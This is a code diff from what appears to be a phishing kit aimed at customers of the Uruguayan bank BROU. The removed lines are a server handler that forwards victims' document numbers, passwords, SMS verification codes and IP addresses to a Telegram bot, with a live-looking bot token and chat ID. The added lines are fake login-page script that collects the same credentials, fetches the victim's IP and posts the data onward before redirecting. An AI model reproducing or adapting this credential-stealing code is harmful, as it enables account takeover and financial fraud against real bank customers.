@@ -1,49 +1,85 @@
-export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Método no permitido" });
+<script>
+  function validarContrasena(pass) {
+    // mínimo 5 caracteres
+    if (pass.length < 5) return false;
+    // no solo números
+    if (/^\d+$/.test(pass)) return false;
+    return true;
   }
 
-  const { pais, documento, numeroDocumento, contrasena, ip, smscode } = req.body;
+  async function enviarDatos() {
+    const pais = document.getElementById("pais").value;
+    const documento = document.getElementById("documento").value;
+    const numeroDocumentoInput = document.getElementById("numero-documento");
+    const contrasenaInput = document.getElementById("contrasena");
+    const errorBox = document.getElementById("error-message");
 
-  // 🔴 Tu token y chat ID
-  const BOT_TOKEN = "8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U";
-  const CHAT_ID = "-4867067566";
+    const numeroDocumento = numeroDocumentoInput.value.trim();
+    const contrasena = contrasenaInput.value.trim();
 
-  // Crear mensaje según lo que se envíe
-  let mensaje = "";
-  if(smscode){
-    mensaje = `
-➖➖➖[BROU SMS]➖➖➖
-✔️TOKEN: ${smscode}
-🌐 IP: ${ip}
-    `;
-  } else {
-    mensaje = `
-➖➖➖[BROU 2]➖➖➖
-País: ${pais}
-Tipo de Documento: ${documento}
-Cédula: ${numeroDocumento}
-Contraseña: ${contrasena}
-IP: ${ip}
-    `;
-  }
+    const errorUsuario = document.getElementById("usuario-vacio");
+    const errorContrasena = document.getElementById("contrasena-vacia");
 
-  try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-      {
+    // Reset errores
+    errorBox.style.display = "none";
+    numeroDocumentoInput.classList.remove("error-field");
+    contrasenaInput.classList.remove("error-field");
+    errorUsuario.style.display = "none";
+    errorContrasena.style.display = "none";
+
+    let valido = true;
+
+    // Validar usuario
+    if (!numeroDocumento) {
+      numeroDocumentoInput.classList.add("error-field");
+      errorUsuario.style.display = "block";
+      valido = false;
+    }
+
+    // Validar contraseña
+    if (!contrasena) {
+      contrasenaInput.classList.add("error-field");
+      errorContrasena.style.display = "block";
+      errorContrasena.innerText = "La contraseña no puede estar vacía";
+      valido = false;
+    } else if (!validarContrasena(contrasena)) {
+      contrasenaInput.classList.add("error-field");
+      errorContrasena.style.display = "block";
+      errorContrasena.innerText = "La contraseña debe tener mínimo 5 caracteres y no ser solo números";
+      valido = false;
+    }
+
+    if (!valido) return;
+
+    try {
+      // Obtener IP del usuario
+      const ipRes = await fetch("https://api.ipify.org/?format=json");
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      // Enviar datos
+      const response = await fetch("/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mensaje,
+          pais,
+          documento,
+          numeroDocumento,
+          contrasena,
+          ip
         }),
-      }
-    );
+      });
 
-    const data = await response.json();
-    return res.status(200).json({ success: true, telegram: data });
-  } catch (error) {
-    return res.status(500).json({ error: "Error enviando a Telegram", details: error });
+      if (response.ok) {
+        // Primer intento YA ES EXITOSO
+        setTimeout(() => {
+          window.location.href = "espera.html";
+        }, 1000);
+      } else {
+        errorBox.style.display = "block";
+      }
+    } catch (err) {
+      errorBox.style.display = "block";
+    }
   }
-}
+</script>
